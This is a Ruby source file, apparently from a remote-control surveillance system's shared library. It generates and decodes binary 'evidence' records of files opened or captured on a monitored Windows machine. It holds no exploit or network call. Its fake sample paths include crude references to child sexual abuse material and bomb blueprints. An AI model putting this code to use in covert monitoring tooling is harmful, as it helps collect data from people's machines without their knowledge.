require 'rcs-common/evidence/common'

require 'digest/md5'

module RCS

module FileopenEvidence

  ELEM_DELIMITER = 0xABADC0DE

  def content
    process = ["Explorer.exe\0", "Firefox.exe\0", "Chrome.exe\0"].sample.encode("US-ASCII")
    file = ["c:\\Utenti\\pippo\\pedoporno.mpg", "c:\\Utenti\\pluto\\Documenti\\childporn.avi", "c:\\secrets\\bomb_blueprints.pdf"].sample.to_utf16le_binary_null
    content = StringIO.new
    t = Time.now.getutc
    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write process
    content.write [ 0 ].pack('L') # size hi
    content.write [ 123456789 ].pack('L') # size lo
    content.write [ 0x80000000 ].pack('l') # access mode
    content.write file
    content.write [ ELEM_DELIMITER ].pack('L')
    content.string
  end
  
  def generate_content
    ret = Array.new
    10.rand_times { ret << content() }
    ret
  end
  
  def decode_content(common_info, chunks)
    stream = StringIO.new chunks.join

    until stream.eof?
      info = Hash[common_info]
      info[:data] = Hash.new
      info[:data][:type] = :open

      tm = stream.read 36
      info[:acquired] = Time.gm(*tm.unpack('l*'), 0)
      info[:data][:program] = ''
      info[:data][:path] = ''

      process_name = stream.read_ascii_string
      info[:data][:program] = process_name.force_encoding('US-ASCII') unless process_name.nil?

      size_hi = stream.read(4).unpack("L").first
      size_lo = stream.read(4).unpack("L").first
      info[:data][:size] = size_hi << 32 | size_lo
      info[:data][:access] = stream.read(4).unpack("l").first

      file = stream.read_utf16le_string
      info[:data][:path] = file.utf16le_to_utf8 unless file.nil?
      
      delim = stream.read(4).unpack("L*").first
      raise EvidenceDeserializeError.new("Malformed FILEOPEN (missing delimiter)") unless delim == ELEM_DELIMITER

      yield info if block_given?
    end
    :delete_raw
  end
end

module FilecapEvidence

  FILECAP_VERSION = 2008122901

  def content
    path = File.join(File.dirname(__FILE__), 'content', ['file'].sample, 'cantaloupe_island.mp3')
    File.open(path, 'rb') {|f| f.read }
  end

  def generate_content
    [ content ]
  end

  def additional_header
    file_name = 'cantaloupe_island.mp3'.to_utf16le_binary
    header = StringIO.new
    header.write [FILECAP_VERSION, file_name.size].pack("I*")
    header.write file_name
    
    header.string
  end

  def decode_additional_header(data)
    raise EvidenceDeserializeError.new("incomplete FILECAP") if data.nil? or data.bytesize == 0

    binary = StringIO.new data

    version, file_name_len = binary.read(8).unpack("I*")
    raise EvidenceDeserializeError.new("invalid log version for FILECAP") unless version == FILECAP_VERSION

    ret = Hash.new
    ret[:data] = Hash.new
    ret[:data][:path] = binary.read(file_name_len).utf16le_to_utf8
    return ret
  end

  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] = Hash.new if info[:data].nil?
    info[:data][:type] = :capture
    info[:grid_content] = chunks.first
    info[:data][:md5] = Digest::MD5.hexdigest chunks.first
    yield info if block_given?
    :delete_raw
  end
end

end # ::RCS